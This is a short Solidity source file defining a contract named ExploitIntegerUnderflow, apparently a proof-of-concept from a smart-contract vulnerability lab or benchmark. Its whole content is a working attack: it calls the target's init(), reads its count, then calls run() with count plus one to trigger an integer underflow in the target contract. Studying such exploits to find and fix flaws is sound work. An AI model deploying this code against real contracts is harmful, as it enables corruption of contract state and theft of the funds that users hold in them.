pragma solidity ^0.4.23;

interface IVulnerable {
    function init() external;
    function run(uint256 input) external;
    function count() external view returns (uint256);
}

contract ExploitIntegerUnderflow {
    IVulnerable public target;

    constructor(address _target) public {
        target = IVulnerable(_target);
    }

    function attack() public {
        // Step 1: Initialize the contract
        target.init();

        // Step 2: Fetch current count
        uint256 currentCount = target.count();

        // Step 3: Call run with input > count to trigger underflow
        target.run(currentCount + 1);
    }
}

